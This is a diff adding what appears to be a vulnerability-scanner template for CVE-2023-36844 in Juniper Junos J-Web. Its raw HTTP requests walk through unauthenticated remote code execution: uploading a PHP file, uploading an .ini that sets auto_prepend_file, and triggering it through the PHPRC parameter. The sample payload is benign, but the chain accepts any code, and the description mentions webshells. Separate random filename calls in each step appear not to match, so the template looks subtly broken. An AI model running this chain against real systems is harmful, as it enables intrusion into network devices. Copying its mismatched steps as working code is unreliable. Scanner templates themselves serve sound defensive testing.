@@ -1,0 +1,64 @@
+id: CVE-2023-36844
+info:
+  name: Junos webauth_operation.php File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Junos is a reliable, high-performance network operating system from Juniper Networks. An attacker can use the J-Web service /webauth_operation.php route of the Junos operating system to upload a PHP webshell, include it through the ?PHPRC parameter, and gain control of the entire web server.
+  reference:
+    - https://supportportal.juniper.net/JSA72300
+  classification:
+    cvss-metrics: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    cvss-score: 9.8
+    cve-id: CVE-2023-36844
+
+variables:
+  php_payload: "<?php echo 'test'; unlink(__FILE__); ?>"
+
+http:
+  - raw:
+      - |
+        POST /webauth_operation.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        rs=do_upload&rsargs[0]=[{"fileData":"data:text/html;base64,{{base64(php_payload)}}","fileName":"{{rand_base(8)}}.php","csize":{{len(php_payload)}}}]
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "converted_fileName"
+          - "original_fileName"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /webauth_operation.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        rs=do_upload&rsargs[0]=[{"fileData":"data:plain/text;base64,{{base64('auto_prepend_file=\"/var/tmp/{{rand_base(8)}}.php\"')}}","fileName":"{{rand_base(8)}}.ini","csize":{{len('auto_prepend_file=\"/var/tmp/{{rand_base(8)}}.php\"')}}}]
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "converted_fileName"
+          - "original_fileName"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /webauth_operation.php?PHPRC=/var/tmp/{{rand_base(8)}}.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "test"
+      - type: status
+        status:
+          - 200
